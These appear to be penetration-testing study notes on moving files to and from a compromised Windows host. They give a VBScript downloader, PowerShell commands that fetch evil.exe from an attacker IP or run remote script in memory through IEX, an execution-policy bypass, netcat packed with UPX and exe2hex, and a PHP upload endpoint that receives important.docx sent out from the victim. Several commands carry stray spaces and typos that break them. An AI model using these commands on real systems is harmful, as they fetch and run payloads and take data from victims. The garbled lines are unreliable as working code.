# Windows File Transfers

* FTP on attacker machine
- Can also use tftp for file transfers  


### Windows Simple HTTP downloader VBs
```
cho	strUrl	=	WScript.Arguments.Item(0)	>	wget.vbs	
echo	StrFile	=	WScript.Arguments.Item(1)	>>	wget.vbs
echo	Const	HTTPREQUEST_PROXYSETTING_DEFAULT	=	0	>>	wget.vbs
echo	Const	HTTPREQUEST_PROXYSETTING_PRECONFIG	=	0	>>	wget.vbs
echo	Const	HTTPREQUEST_PROXYSETTING_DIRECT	=	1	>>	wget.vbs
echo	Const	HTTPREQUEST_PROXYSETTING_PROXY	=	2	>>	wget.vbs
echo	Dim	http,	varByteArray,	strData,	strBuffer,	lngCounter,	fs,	ts	>>	wget.vbs
echo	Err.Clear	>>	wget.vbs
echo	Set	http	=	Nothing	>>	wget.vbs
echo	Set	http	=	CreateObject("WinHttp.WinHttpRequest.5.1")	>>	wget.vbs
echo	If	http	Is	Nothing	Then	Set	http	=	CreateObject("WinHttp.WinHttpRequest")	>>	wge	t.vbs
echo	If	http	Is	Nothing	Then	Set	http	=	CreateObject("MSXML2.ServerXMLHTTP")	>>	wget.	vbs
echo	If	http	Is	Nothing	Then	Set	http	=	CreateObject("Microsoft.XMLHTTP")	>>	wget.vbs	
echo	http.Open	"GET",	strURL,	False	>>	wget.vbs
echo	http.Send	>>	wget.vbs
echo	varByteArray	=	http.ResponseBody	>>	wget.vbs
echo	Set	http	=	Nothing	>>	wget.vbs
echo	Set	fs	=	CreateObject("Scripting.FileSystemObject")	>>	wget.vbs
echo	Set	ts	=	fs.CreateTextFile(StrFile,	True)	>>	wget.vbs
echo	strData	=	""	>>	wget.vbs
echo	strBuffer	=	""	>>	wget.vbs
echo	For	lngCounter	=	0	to	UBound(varByteArray)	>>	wget.vbs
echo	ts.Write	Chr(255	And	Ascb(Midb(varByteArray,lngCounter	+	1,	1)))	>>	wget.vbs	
echo	Next	>>	wget.vbs
echo	ts.Close	>>	wget.vbs	
```

To run the above:  `cscript wget.vbs http://10.11.0.4/evil.exe evil.exe`

### Using powershell
Another way on newer machines is to use powershell:
```
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1 C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1 C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1 C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Run the above using `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1`  
Powershell default exec policy is restriction, no logo to not seee logo and nopro for prevention of loading default profile

Can do the same in one line without creating a file:   
`c> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/evil.exe', 'newexploit.exe')`

Can also execute a file without saving it to disk:
`powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(' http://10.11.0.4/helloworld.ps1')`


### Windows Downloads with exe2hex and PowerShell
Compress a binary, then convert to a hex string, embed to a windows script
Can use UPX: PE compression tool

On attacker machine: `upx -9 nc.exe`
`exe2hex -x nc.exe -p nc.cmd`
Transfer the nc file and on the windows host, run `powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$ h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte ]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1}; set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"`
command above can be found in the nc.cmd 


### Windows uploads using scripting languages
On attacker kali machine, start an apache server and create an uploads directory. Change owner to www-data
```
<?php	
$uploaddir	=	'/var/www/uploads/';
$uploadfile	=	$uploaddir	.	$_FILES['file']['name'];	
move_uploaded_file($_FILES['file']['tmp_name'],	$uploadfile)	?>	
```

From windows machine: `powershell (New-Object System.Net.WebClient).UploadFile('http://10.11 .0.4/upload.php', 'important.docx')`
